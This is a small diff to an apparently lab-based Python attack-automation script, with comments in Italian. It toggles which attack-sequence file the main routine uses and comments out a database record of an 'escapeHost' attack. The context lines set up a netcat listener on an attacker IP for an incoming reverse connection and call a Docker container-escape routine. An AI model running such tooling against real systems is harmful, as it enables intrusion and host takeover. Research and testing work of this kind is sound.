@@ -140,7 +140,7 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                         
-                        docker_escape_attack_obj = attack_db.create_attack("escapeHost", None, attacker_ip, C.NETCAT_PORT)
+                        #docker_escape_attack_obj = attack_db.create_attack("escapeHost", None, attacker_ip, C.NETCAT_PORT)
                         escape=mc.docker_escape(atk_sess)
                         
                         if(escape):
@@ -174,5 +174,5 @@ def main_procedure (attacker_ip, config_file, attack_sequence_file = None, steal
 #Come terzo parametro si può passare un file json contenente la sequenza degli attacchi da eseguire 
 #Se non viene passato gli attacchi vengono effettuati in ordine casuale fino a quando uno non va a buon fine
 if(__name__=='__main__'):
-    #main_procedure(C.ATTACKER_VM,"config.json", "Attack_sequence.json")
-    main_procedure(C.ATTACKER_VM,"config.json")
+    main_procedure(C.ATTACKER_VM,"config.json", "Attack_sequence.json")
+    #main_procedure(C.ATTACKER_VM,"config.json")
